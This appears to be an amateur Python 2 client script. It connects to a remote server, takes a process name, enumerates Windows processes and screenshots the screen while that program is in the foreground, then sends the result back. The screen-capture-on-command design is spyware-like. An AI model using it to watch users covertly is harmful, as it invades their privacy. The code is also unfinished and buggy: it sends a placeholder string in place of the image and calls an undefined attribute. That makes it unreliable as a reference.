###############################
#########  IMPORTS  ###########
###############################
import sys
import errno
import socket
import pickle
import win32process
import win32api
import win32con
import win32gui
import time
from PIL import ImageGrab

###############################
########  VARIABLES  ##########
###############################
IP = "34V7-18"
PORT = 8085
ADDRESS = (IP, PORT)
BLOCKING = 0
BUFFER = 4096
###############################
#########  CLASSES  ###########
###############################
class Client(object):
    def __init__(self):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect(ADDRESS)
        #self.client.setblocking(BLOCKING)

    def shutdown(self):
        self.client.close()

    def CheckifProcess(self, procname):
        processes = win32process.EnumProcesses()
        ifopen =False
        iffront=False
        ans=False
        data = ""
        IOIF={"if open":False, "if front":False}
        proc=[]
        for pid in processes:
            try:
                handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, pid)
                exe = win32process.GetModuleFileNameEx(handle, 0)
                exe=exe.rsplit("\\")
                exe=exe[-1]
                proc.append({"Process name":exe,"Process id":pid,"Process handle":handle})
            except: pass
        hWindow = win32gui.GetForegroundWindow()
        procid_first= win32process.GetWindowThreadProcessId(hWindow)[1]
        for i in range(len(proc)):
            if(proc[i]["Process name"]==procname):
                ifopen=True
                IOIF["if open"]=True
                if proc[i]["Process id"]==procid_first:
                    iffront=True
                    IOIF["if front"]=True
            else:
                i+=1
        return IOIF

    #------------------------------------------------------------------------------------------------------------------
    def get_processes(self):
        processes = win32process.EnumProcesses()
        data = ""
        dict={"Process name":"","Process id":"","Process handle":""}
        proc=[]
        for pid in processes:
            try:
                handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, pid)
                exe = win32process.GetModuleFileNameEx(handle, 0)
                exe=exe.rsplit("\\")
                exe=exe[-1]
                proc.append({"Process name":exe,"Process id":pid,"Process handle":handle})
            except: pass
        return proc

    #------------------------------------------------------------------------------------------------------------------
    def  send_picture(self):
        picture = ImageGrab.grab()  #  PrintScreen
        # sending picture to client
        #image = {'pixels': picture.tostring(), 'size': picture.size, 'mode': picture.mode}
        data = picture.tostring() #pickle.dumps(image)
        self.client.send(str(len(data)))
        ack1 = self.client.recv(100)
        print ack1
        self.client.send("Shalom") #data)
        ack2 = self.client.recv(100)
        print ack2

    #------------------------------------------------------------------------------------------------------------------
    def run(self):
        self.running = True
        while self.running:
            try:
                data = self.client.recv(BUFFER)
                print data
                if "exe" in data:
                    ans=False
                    time.sleep(5)
                    procname=data
                    proc = self.get_processes()
                    hWindow = win32gui.GetForegroundWindow()
                    procid_first= win32process.GetWindowThreadProcessId(hWindow)[1]
                    for i in range(len(proc)):
                        printf=False
                        while proc[i]["Process name"]==procname:
                            ans=True
                            if proc[i]["Process id"]!=procid_first:
                                pass
                            else:
                                check=self.CheckifProcess(proc[i]["Process name"])
                                if check["if front"]==False and printf==False:
                                    print procname, "was minimized or closed... please wait..."              #waiting that process will come to front - minimized or closed
                                    printf=True
                                while(check["if open"]==True and check["if front"]==True):
                                    printf=False
                                    self.send_picture()
                                    time.sleep(2)
                                    check=self.CheckifProcess(proc[i]["Process name"])
                        else :
                            i+=1
                    if (ans == False):
                        print procname,"isn't running"
                else:
                    print "Wrong command"
            except socket.error as socketerror:
                print socketerror.errno
                if socketerror.errno == errno.WSAECONNRESET:
                    # An existing connection was forcibly closed by the remote host
                    self.running = False
                try:
                    command = self.gui.recv(BUFFER)
                    self.client.send(command)
                except:
                    pass

    def __enter__(self):
        return self

    def __exit__ (self, type, value, traceback): 
        self.shutdown()
###############################
########  FUNCTIONS  ##########
###############################
def main(argv=[]):
    with Client() as client:
        client.run()
###############################
###########  MAIN  ############
###############################
if __name__ == "__main__":
    main(sys.argv[1: ])
###############################
###########  QUIT  ############
###############################
